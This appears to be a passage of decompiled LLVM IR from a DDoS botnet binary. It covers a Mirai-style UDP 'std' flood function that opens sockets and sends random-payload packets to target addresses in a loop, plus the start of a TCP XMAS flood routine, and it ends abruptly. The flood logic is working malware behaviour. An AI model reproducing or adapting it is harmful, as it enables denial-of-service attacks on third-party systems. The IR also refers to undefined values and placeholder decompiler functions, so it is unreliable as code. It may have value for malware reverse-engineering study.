  %v3_9540 = load i32, i32* %stack_var_-44, align 4
  %v5_9548 = mul i32 %v3_9540, 24
  %v0_954c = load i32, i32* %r4.global-to-local, align 4
  %v1_954c = and i32 %v0_954c, 16711680
  store i32 %v1_954c, i32* %ip.global-to-local, align 4
  %v3_9550 = udiv i32 %v0_954c, 16777216
  %v4_9554 = udiv i32 %v1_954c, 256
  %v5_9554 = or i32 %v4_9554, %v3_9550
  store i32 %v5_9554, i32* %r2.global-to-local, align 4
  %v1_9558 = load i32, i32* @sb, align 4
  %v2_9558 = add i32 %v1_9558, %v5_9548
  store i32 %v2_9558, i32* %r1.global-to-local, align 4
  %v1_955c = and i32 %v0_954c, 65280
  store i32 %v1_955c, i32* %r3.global-to-local, align 4
  %v1_9560 = add i32 %v2_9558, 20
  %v2_9560 = inttoptr i32 %v1_9560 to i8*
  %v3_9560 = load i8, i8* %v2_9560, align 1
  %v4_9560 = zext i8 %v3_9560 to i32
  store i32 %v4_9560, i32* %ip.global-to-local, align 4
  %v5_9568 = call i32 @llvm.bswap.i32(i32 %v0_954c)
  %v7_956c = lshr i32 %v0_953c, %v4_9560
  %v8_956c = add i32 %v7_956c, %v5_9568
  store i32 %v8_956c, i32* %r2.global-to-local, align 4
  store i32 %v6_917c, i32* %r1.global-to-local, align 4
  %v5_9588 = call i32 @llvm.bswap.i32(i32 %v8_956c)
  store i32 %v5_9588, i32* %r3.global-to-local, align 4
  store i1 %v7_943c, i1* %cpsr_z.global-to-local, align 1
  %v1_9590 = load i32, i32* @r5, align 4
  %v2_9590 = add i32 %v1_9590, 16
  %v3_9590 = inttoptr i32 %v2_9590 to i32*
  store i32 %v5_9588, i32* %v3_9590, align 4
  br i1 %v2_943c, label %dec_label_pc_9598, label %dec_label_pc_9444

dec_label_pc_9598:                                ; preds = %dec_label_pc_9538, %dec_label_pc_9438
  %v0_9598 = call i32 @rand_next()
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r4.global-to-local, align 4
  %v0_95a4 = load i32, i32* @fp, align 4
  %v9_95a4 = icmp eq i32 %v0_95a4, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  store i1 %v9_95a4, i1* %cpsr_z.global-to-local, align 1
  %v1_95a8 = load i32, i32* @r5, align 4
  %v2_95a8 = add i32 %v1_95a8, 12
  %v3_95a8 = inttoptr i32 %v2_95a8 to i32*
  store i32 %v0_9598, i32* %v3_95a8, align 4
  br i1 %v9_95a4, label %dec_label_pc_95b0, label %dec_label_pc_9598.dec_label_pc_9454_crit_edge

dec_label_pc_9598.dec_label_pc_9454_crit_edge:    ; preds = %dec_label_pc_9598
  %v1_9458.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9454

dec_label_pc_95b0:                                ; preds = %dec_label_pc_9598, %dec_label_pc_9444
  %v0_95b0 = call i32 @rand_next()
  %v3_95b8 = urem i32 %v0_95b0, 65536
  store i32 %v3_91dc, i32* %r2.global-to-local, align 4
  %v1_95c4 = sub nsw i32 999, %v3_95b8
  store i32 %v1_95c4, i32* %r3.global-to-local, align 4
  %v1_95c8 = load i32, i32* %r4.global-to-local, align 4
  %v9_95c8 = icmp eq i32 %v3_91dc, %v1_95c8
  store i1 %v9_95c8, i1* %cpsr_z.global-to-local, align 1
  %v1_95cc = trunc i32 %v0_95b0 to i16
  %v2_95cc = load i32, i32* @r5, align 4
  %v3_95cc = add i32 %v2_95cc, 4
  %v4_95cc = inttoptr i32 %v3_95cc to i16*
  store i16 %v1_95cc, i16* %v4_95cc, align 2
  %v0_95d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_95d0 = trunc i32 %v0_95d0 to i16
  %v2_95d0 = load i32, i32* @r6, align 4
  %v3_95d0 = add i32 %v2_95d0, 4
  %v4_95d0 = inttoptr i32 %v3_95d0 to i16*
  store i16 %v1_95d0, i16* %v4_95d0, align 2
  br i1 %v9_95c8, label %dec_label_pc_95d8, label %dec_label_pc_95b0.dec_label_pc_9460_crit_edge

dec_label_pc_95b0.dec_label_pc_9460_crit_edge:    ; preds = %dec_label_pc_95b0
  %v1_9464.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9460

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95b0, %dec_label_pc_9454
  %v0_95d8 = call i32 @rand_next()
  %v1_95d8 = trunc i32 %v0_95d8 to i16
  store i32 %v3_91e0, i32* %r3.global-to-local, align 4
  %v1_95e0 = load i32, i32* %r4.global-to-local, align 4
  %v9_95e0 = icmp eq i32 %v3_91e0, %v1_95e0
  store i1 %v9_95e0, i1* %cpsr_z.global-to-local, align 1
  %v3_95e4 = load i32, i32* @r5, align 4
  %v4_95e4 = add i32 %v3_95e4, 44
  %v5_95e4 = inttoptr i32 %v4_95e4 to i16*
  store i16 %v1_95d8, i16* %v5_95e4, align 2
  br i1 %v9_95e0, label %dec_label_pc_95ec, label %dec_label_pc_946c

dec_label_pc_95ec:                                ; preds = %dec_label_pc_95d8, %dec_label_pc_9460
  %v0_95ec = call i32 @rand_next()
  %v1_95ec = trunc i32 %v0_95ec to i16
  store i32 %v1_91d4, i32* @r4, align 4
  store i1 %v2_95f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95f4, label %.thread30, label %bb83

.thread30:                                        ; preds = %dec_label_pc_95ec
  %v3_95fc31 = load i32, i32* @r7, align 4
  %v4_95fc32 = add i32 %v3_95fc31, 2
  %v5_95fc33 = inttoptr i32 %v4_95fc32 to i16*
  store i16 %v1_95ec, i16* %v5_95fc33, align 2
  br label %dec_label_pc_9608

bb83:                                             ; preds = %dec_label_pc_95ec
  %v1_95f8 = load i32, i32* @r5, align 4
  %v2_95f8 = add i32 %v1_95f8, 16
  %v3_95f8 = inttoptr i32 %v2_95f8 to i32*
  %v4_95f8 = load i32, i32* %v3_95f8, align 4
  store i32 %v4_95f8, i32* %r3.global-to-local, align 4
  %v3_95fc = load i32, i32* @r7, align 4
  %v4_95fc = add i32 %v3_95fc, 2
  %v5_95fc = inttoptr i32 %v4_95fc to i16*
  store i16 %v1_95ec, i16* %v5_95fc, align 2
  %v1_9600 = load i32, i32* %r3.global-to-local, align 4
  %v2_9600 = load i32, i32* @r6, align 4
  %v3_9600 = add i32 %v2_9600, 16
  %v4_9600 = inttoptr i32 %v3_9600 to i32*
  store i32 %v1_9600, i32* %v4_9600, align 4
  br label %dec_label_pc_9480

dec_label_pc_9608:                                ; preds = %.thread30, %dec_label_pc_946c
  %v0_9608 = call i32 @rand_next()
  store i32 %v1_9148, i32* %r1.global-to-local, align 4
  store i1 %v2_9610, i1* %cpsr_z.global-to-local, align 1
  %v1_9614 = load i32, i32* @r6, align 4
  %v2_9614 = add i32 %v1_9614, 16
  %v3_9614 = inttoptr i32 %v2_9614 to i32*
  store i32 %v0_9608, i32* %v3_9614, align 4
  br i1 %v2_9610, label %dec_label_pc_948c, label %dec_label_pc_961c

dec_label_pc_961c:                                ; preds = %dec_label_pc_9480, %dec_label_pc_9608
  %v0_961c = load i32, i32* @r7, align 4
  %v1_961c = add i32 %v0_961c, 8
  store i32 %v6_9128, i32* %r1.global-to-local, align 4
  %v2_9624 = inttoptr i32 %v1_961c to i16*
  %v3_9624 = call i32 @rand_str(i16* %v2_9624, i32 %v6_9128)
  br label %dec_label_pc_948c

dec_label_pc_962c:                                ; preds = %dec_label_pc_91a0
  %v1_9630 = call i32 @__GI___libc_close(i32 %v3_9190)
  br label %dec_label_pc_9634

dec_label_pc_9634:                                ; preds = %entry, %dec_label_pc_962c
  %v1_963c = phi i32 [ %v3_9190, %entry ], [ %v1_9630, %dec_label_pc_962c ]
  store i32 %v3_9040, i32* %r4.global-to-local, align 4
  store i32 %v6_9040, i32* %r5.global-to-local, align 4
  store i32 %v24_9040, i32* %fp.global-to-local, align 4
  ret i32 %v1_963c

dec_label_pc_9640:                                ; preds = %dec_label_pc_91c8
  store i32 %v6_9128, i32* %r2.global-to-local, align 4
  %v1_9648 = add i32 %v6_9128, 8
  store i32 %v1_9648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_93fc.preheader

; uselistorder directives
  uselistorder i32 %v1_9648, { 1, 0 }
  uselistorder i16 %v1_95ec, { 1, 0 }
  uselistorder i32 %v0_95b0, { 1, 0 }
  uselistorder i32 %v5_9588, { 1, 0 }
  uselistorder i32 %v0_954c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9528, { 1, 2, 0 }
  uselistorder i32 %v1_9524, { 2, 0, 3, 1 }
  uselistorder i32 %v3_94d8, { 1, 0, 2 }
  uselistorder i32 %v0_94c0, { 1, 0, 2, 3 }
  uselistorder i32 %v7_9424, { 1, 0, 2 }
  uselistorder i1 %v7_943c, { 2, 1, 0 }
  uselistorder i1 %v2_9610, { 2, 3, 1, 0 }
  uselistorder i1 %v2_95f4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9398, { 1, 0 }
  uselistorder i32 %v4_930c13, { 1, 0 }
  uselistorder i32 %v3_9230, { 1, 0 }
  uselistorder i32 %v3_9214, { 1, 2, 0 }
  uselistorder i32 %v1_9210, { 1, 0 }
  uselistorder i32 %v1_91d4, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_91d0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_91cc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_91c8, { 1, 0, 2, 3 }
  uselistorder i1 %v7_91c0, { 1, 0 }
  uselistorder i1 %v7_9194, { 1, 0 }
  uselistorder i32 %v3_9190, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v6_917c, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_9148, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_9128, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_90dc, { 1, 2, 0 }
  uselistorder i32 %v1_90b8, { 3, 2, 1, 0 }
  uselistorder i32 %v6_90b0, { 1, 0 }
  uselistorder i32 %v6_9074, { 2, 1, 3, 0 }
  uselistorder i32 %v2_905c, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 5, 2, 6, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 7, 6, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 27, 29, 28, 30, 31, 33, 32, 35, 34, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9634, { 1, 0 }
  uselistorder label %dec_label_pc_961c, { 1, 0 }
  uselistorder label %dec_label_pc_948c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_93fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93fc.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @attack_std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_965c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_9678 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_9678, i32* @sl, align 4
  %v0_9684 = load i32, i32* @r7, align 4
  %v2_9688 = call i32 @calloc(i32 %v0_9684, i32 4)
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* @r4, align 4
  %v0_9694 = load i32, i32* @r6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 %v2_9688, i32* @r8, align 4
  %v0_96a4 = load i32, i32* @r5, align 4
  %v5_96a8 = inttoptr i32 %v0_9694 to i32*
  %v6_96a8 = call i32 @attack_get_opt_int(i32 %v0_96a4, i32* %v5_96a8, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v3_96b0 = urem i32 %v6_96a8, 65536
  %v0_96b4 = load i32, i32* @r6, align 4
  %v0_96bc = load i32, i32* @r4, align 4
  store i32 %v0_96bc, i32* %r3.global-to-local, align 4
  %v0_96c0 = load i32, i32* @r5, align 4
  %v5_96c8 = inttoptr i32 %v0_96b4 to i32*
  %v6_96c8 = call i32 @attack_get_opt_int(i32 %v0_96c0, i32* %v5_96c8, i32 6, i32 %v0_96bc, i32 %v3_96b0)
  %v0_96cc = load i32, i32* @r6, align 4
  %v3_96d0 = mul i32 %v6_96c8, 65536
  store i32 %v3_96d0, i32* %sb.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v0_96dc = load i32, i32* @r5, align 4
  %v5_96e0 = inttoptr i32 %v0_96cc to i32*
  %v6_96e0 = call i32 @attack_get_opt_int(i32 %v0_96dc, i32* %v5_96e0, i32 0, i32 1024, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_96f0 = load i32, i32* @r6, align 4
  %v0_96f4 = load i32, i32* @r5, align 4
  %v3_96f8 = urem i32 %v6_96e0, 65536
  store i32 %v3_96f8, i32* @r5, align 4
  %v5_96fc = inttoptr i32 %v0_96f0 to i32*
  %v6_96fc = call i32 @attack_get_opt_int(i32 %v0_96f4, i32* %v5_96fc, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_9700 = load i32, i32* %sb.global-to-local, align 4
  %v3_9700 = udiv i32 %v0_9700, 65536
  store i32 %v3_9700, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_9708 = load i32, i32* @r4, align 4
  %v9_9708 = icmp eq i32 %v3_9700, %v1_9708
  br i1 %v9_9708, label %dec_label_pc_9738, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_9720 = udiv i32 %v0_9700, 16777216
  store i32 %v4_9720, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9748

dec_label_pc_9738:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_9738 = call i32 @rand_next()
  br label %dec_label_pc_9748

dec_label_pc_9748:                                ; preds = %bb, %dec_label_pc_9738
  %v0_972c10 = urem i32 %v6_96fc, 256
  %v0_9748 = load i32, i32* @r7, align 4
  %v2_9748 = icmp eq i32 %v0_9748, 0
  br i1 %v2_9748, label %dec_label_pc_9888, label %dec_label_pc_9750

dec_label_pc_9750:                                ; preds = %dec_label_pc_9748
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_97fc = udiv i32 %v3_96b0, 256
  %v1_97f8 = mul i32 %v6_96a8, 256
  %v4_9800 = and i32 %v1_97f8, 65280
  %v5_9800 = or i32 %v4_9800, %v3_97fc
  %v2_9780 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_97e0

dec_label_pc_9760:                                ; preds = %bb51, %dec_label_pc_9820
  %v3_976c = call i32 @socket(i32 2, i32 2, i32 0)
  %v7_9774 = icmp eq i32 %v3_976c, -1
  %v0_9778 = load i32, i32* @sb, align 4
  %v1_9778 = add i32 %v0_9778, 1
  store i32 %v1_9778, i32* @sb, align 4
  %v0_977c = load i32, i32* @fp, align 4
  %v1_977c = add i32 %v0_977c, 24
  store i32 %v1_977c, i32* @fp, align 4
  %v2_9788 = load i32, i32* @r8, align 4
  %v3_9788 = add i32 %v2_9788, %stack_var_-60.0
  %v4_9788 = inttoptr i32 %v3_9788 to i32*
  store i32 %v3_976c, i32* %v4_9788, align 4
  br i1 %v7_9774, label %dec_label_pc_987c, label %dec_label_pc_9790

dec_label_pc_9790:                                ; preds = %dec_label_pc_9760
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_97a8 = call i32 @bind(i32 %v3_976c, i32 %v2_9780, i32 16)
  %v0_97ac = load i32, i32* @r6, align 4
  %v1_97ac = add i32 %v0_97ac, 20
  %v2_97ac = inttoptr i32 %v1_97ac to i8*
  %v3_97ac = load i8, i8* %v2_97ac, align 1
  %v4_97ac = zext i8 %v3_97ac to i32
  store i32 %v4_97ac, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_97ac, 32
  br i1 %tmp, label %dec_label_pc_9834, label %dec_label_pc_97b8

dec_label_pc_97b8:                                ; preds = %dec_label_pc_9790, %dec_label_pc_9834
  %v0_97bc = phi i32 [ %v0_97ac, %dec_label_pc_9790 ], [ %v0_97bc.pre, %dec_label_pc_9834 ]
  %v1_97c0 = load i32, i32* @r8, align 4
  %v2_97c0 = add i32 %v1_97c0, %stack_var_-60.0
  %v3_97c0 = inttoptr i32 %v2_97c0 to i32*
  %v4_97c0 = load i32, i32* %v3_97c0, align 4
  %v3_97c8 = call i32 @__libc_connect(i32 %v4_97c0, i32 %v0_97bc, i32 16)
  %v0_97d0 = load i32, i32* @sb, align 4
  %v1_97d0 = load i32, i32* @r7, align 4
  %v9_97d0 = icmp eq i32 %v0_97d0, %v1_97d0
  %v1_97d4 = add i32 %stack_var_-60.0, 4
  store i32 %v1_97d4, i32* %r3.global-to-local, align 4
  br i1 %v9_97d0, label %dec_label_pc_9888, label %dec_label_pc_97e0

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97b8, %dec_label_pc_9750
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_9750 ], [ %v1_97d4, %dec_label_pc_97b8 ]
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* @r4, align 4
  %v2_97f0 = call i32 @calloc(i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 1)
  store i32 %v5_9800, i32* %r3.global-to-local, align 4
  %v1_980c = load i32, i32* @r4, align 4
  %v9_980c = icmp eq i32 %v3_96b0, %v1_980c
  %v1_9810 = load i32, i32* @fp, align 4
  %v2_9810 = add i32 %v1_9810, %arg2
  store i32 %v2_9810, i32* @r6, align 4
  %v2_9814 = load i32, i32* @sl, align 4
  %v3_9814 = add i32 %v2_9814, %stack_var_-60.0
  %v4_9814 = inttoptr i32 %v3_9814 to i32*
  store i32 %v2_97f0, i32* %v4_9814, align 4
  br i1 %v9_980c, label %dec_label_pc_9820, label %bb51

bb51:                                             ; preds = %dec_label_pc_97e0
  %v1_9818 = load i32, i32* %r3.global-to-local, align 4
  %v2_9818 = trunc i32 %v1_9818 to i16
  %v3_9818 = load i32, i32* @r6, align 4
  %v4_9818 = add i32 %v3_9818, 2
  %v5_9818 = inttoptr i32 %v4_9818 to i16*
  store i16 %v2_9818, i16* %v5_9818, align 2
  br label %dec_label_pc_9760

dec_label_pc_9820:                                ; preds = %dec_label_pc_97e0
  %v0_9820 = call i32 @rand_next()
  %v1_9820 = trunc i32 %v0_9820 to i16
  %v0_9828 = load i32, i32* @fp, align 4
  %v2_9828 = add i32 %v0_9828, %arg2
  store i32 %v2_9828, i32* @r6, align 4
  %v4_982c = add i32 %v2_9828, 2
  %v5_982c = inttoptr i32 %v4_982c to i16*
  store i16 %v1_9820, i16* %v5_982c, align 2
  br label %dec_label_pc_9760

dec_label_pc_9834:                                ; preds = %dec_label_pc_9790
  %v1_9834 = add i32 %v0_97ac, 16
  %v2_9834 = inttoptr i32 %v1_9834 to i32*
  %v3_9834 = load i32, i32* %v2_9834, align 4
  store i32 %v3_9834, i32* @r4, align 4
  %v0_9838 = call i32 @rand_next()
  %v0_983c = load i32, i32* @r4, align 4
  %v1_9848 = and i32 %v0_983c, 65280
  store i32 %v1_9848, i32* %r3.global-to-local, align 4
  %v0_9850 = load i32, i32* @r6, align 4
  %v1_9850 = add i32 %v0_9850, 20
  %v2_9850 = inttoptr i32 %v1_9850 to i8*
  %v3_9850 = load i8, i8* %v2_9850, align 1
  %v4_9850 = zext i8 %v3_9850 to i32
  %v5_9854 = call i32 @llvm.bswap.i32(i32 %v0_983c)
  %v7_9858 = lshr i32 %v0_9838, %v4_9850
  %v8_9858 = add i32 %v7_9858, %v5_9854
  %v5_9870 = call i32 @llvm.bswap.i32(i32 %v8_9858)
  store i32 %v5_9870, i32* %r3.global-to-local, align 4
  %v2_9874 = add i32 %v0_9850, 4
  %v3_9874 = inttoptr i32 %v2_9874 to i32*
  store i32 %v5_9870, i32* %v3_9874, align 4
  %v0_97bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_97b8

dec_label_pc_987c:                                ; preds = %dec_label_pc_9760
  store i32 %v18_965c, i32* %sb.global-to-local, align 4
  ret i32 %v3_976c

dec_label_pc_9888:                                ; preds = %dec_label_pc_97b8, %dec_label_pc_9748
  %v1_98c822 = phi i32 [ 0, %dec_label_pc_9748 ], [ %v0_97d0, %dec_label_pc_97b8 ]
  %v2_988c = icmp eq i32 %v0_972c10, 0
  br i1 %v2_988c, label %dec_label_pc_98ac.outer, label %dec_label_pc_98c4

dec_label_pc_989c:                                ; preds = %dec_label_pc_98ac
  store i32 %v1_98a0, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_989c = load i32, i32* @r8, align 4
  %v4_989c = mul i32 %v1_98a0, 4
  %v5_989c = add i32 %v0_989c, %v4_989c
  %v6_989c = inttoptr i32 %v5_989c to i32*
  %v7_989c = load i32, i32* %v6_989c, align 4
  %v0_98a0 = load i32, i32* @sl, align 4
  %v5_98a0 = add i32 %v0_98a0, %v4_989c
  %v6_98a0 = inttoptr i32 %v5_98a0 to i32*
  %v7_98a0 = load i32, i32* %v6_98a0, align 4
  %v4_98a4 = call i32 @__libc_send(i32 %v7_989c, i32 %v7_98a0, i32 %v0_98b0, i32 16384)
  %v0_98a8 = load i32, i32* @r4, align 4
  %v1_98a8 = add i32 %v0_98a8, 1
  %v0_98ac.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_98ac.outer

dec_label_pc_98ac.outer:                          ; preds = %dec_label_pc_9888, %dec_label_pc_989c
  %v0_98ac.ph = phi i32 [ %v0_98ac.pre.pre, %dec_label_pc_989c ], [ %v1_98c822, %dec_label_pc_9888 ]
  %v1_98a0.ph = phi i32 [ %v1_98a8, %dec_label_pc_989c ], [ 0, %dec_label_pc_9888 ]
  %v0_98b0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_98ac

dec_label_pc_98ac:                                ; preds = %dec_label_pc_98ac.outer, %dec_label_pc_98ac
  %v1_98a0 = phi i32 [ 0, %dec_label_pc_98ac ], [ %v1_98a0.ph, %dec_label_pc_98ac.outer ]
  %v8_98b8 = icmp sgt i32 %v0_98ac.ph, %v1_98a0
  br i1 %v8_98b8, label %dec_label_pc_989c, label %dec_label_pc_98ac

dec_label_pc_98c4:                                ; preds = %dec_label_pc_98c8, %dec_label_pc_9888
  %v1_98c821 = phi i32 [ %v1_98c822, %dec_label_pc_9888 ], [ %v1_98c8, %dec_label_pc_98c8 ]
  br label %dec_label_pc_98c8

dec_label_pc_98c8:                                ; preds = %dec_label_pc_98d4, %dec_label_pc_98c4
  %v1_98c8 = phi i32 [ %v1_98c821, %dec_label_pc_98c4 ], [ %v1_98c8.pre, %dec_label_pc_98d4 ]
  %v1_98d4 = phi i32 [ 0, %dec_label_pc_98c4 ], [ %v1_98f4, %dec_label_pc_98d4 ]
  store i32 %v1_98d4, i32* @r6, align 4
  %v6_98d0 = icmp slt i32 %v1_98d4, %v1_98c8
  br i1 %v6_98d0, label %dec_label_pc_98d4, label %dec_label_pc_98c4

dec_label_pc_98d4:                                ; preds = %dec_label_pc_98c8
  %v0_98cc = load i32, i32* @r5, align 4
  %v0_98d4 = load i32, i32* @sl, align 4
  %v4_98d4 = mul i32 %v1_98d4, 4
  %v5_98d4 = add i32 %v0_98d4, %v4_98d4
  %v6_98d4 = inttoptr i32 %v5_98d4 to i32*
  %v7_98d4 = load i32, i32* %v6_98d4, align 4
  store i32 %v7_98d4, i32* @r4, align 4
  %v2_98dc = inttoptr i32 %v7_98d4 to i16*
  %v3_98dc = call i32 @rand_str(i16* %v2_98dc, i32 %v0_98cc)
  %v0_98e0 = load i32, i32* @r8, align 4
  %v1_98e0 = load i32, i32* @r6, align 4
  %v4_98e0 = mul i32 %v1_98e0, 4
  %v5_98e0 = add i32 %v4_98e0, %v0_98e0
  %v6_98e0 = inttoptr i32 %v5_98e0 to i32*
  %v7_98e0 = load i32, i32* %v6_98e0, align 4
  %v0_98e4 = load i32, i32* @r4, align 4
  %v0_98e8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_98f0 = call i32 @__libc_send(i32 %v7_98e0, i32 %v0_98e4, i32 %v0_98e8, i32 16384)
  %v0_98f4 = load i32, i32* @r6, align 4
  %v1_98f4 = add i32 %v0_98f4, 1
  %v1_98c8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_98c8

; uselistorder directives
  uselistorder i32 %v1_98c8, { 1, 0 }
  uselistorder i32 %v1_98a0, { 2, 1, 0 }
  uselistorder i32 %v5_9870, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_97ac, { 1, 0, 2 }
  uselistorder i32 %v3_976c, { 1, 3, 2, 0 }
  uselistorder i32 %v3_9700, { 1, 0 }
  uselistorder i32 %v3_96b0, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_98ac, { 1, 0 }
  uselistorder label %dec_label_pc_98ac.outer, { 1, 0 }
  uselistorder label %dec_label_pc_97b8, { 1, 0 }
  uselistorder label %dec_label_pc_9760, { 1, 0 }
  uselistorder label %dec_label_pc_9748, { 1, 0 }
}

define i32 @attack_tcp_xmas(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_98fc = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_9918 = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_9924 = load i32, i32* @r6, align 4
  store i32 %v0_9924, i32* %r0.global-to-local, align 4
  %v2_9928 = call i32 @calloc(i32 %v0_9924, i32 4)
  %v0_992c = load i32, i32* @r5, align 4
  store i32 %v0_992c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_993c = load i32, i32* @r4, align 4
  store i32 %v0_993c, i32* %r0.global-to-local, align 4
  %v5_9940 = inttoptr i32 %v0_992c to i32*
  %v6_9940 = call i32 @attack_get_opt_int(i32 %v0_993c, i32* %v5_9940, i32 2, i32 0, i32 %v2_9928)
  %v1_994c = urem i32 %v6_9940, 256
  store i32 %v1_994c, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9958 = load i32, i32* @r5, align 4
  store i32 %v0_9958, i32* %r1.global-to-local, align 4
  %v0_995c = load i32, i32* @r4, align 4
  store i32 %v0_995c, i32* %r0.global-to-local, align 4
  %v5_9960 = trunc i32 %v6_9940 to i8
  %v6_9964 = inttoptr i32 %v0_9958 to i32*
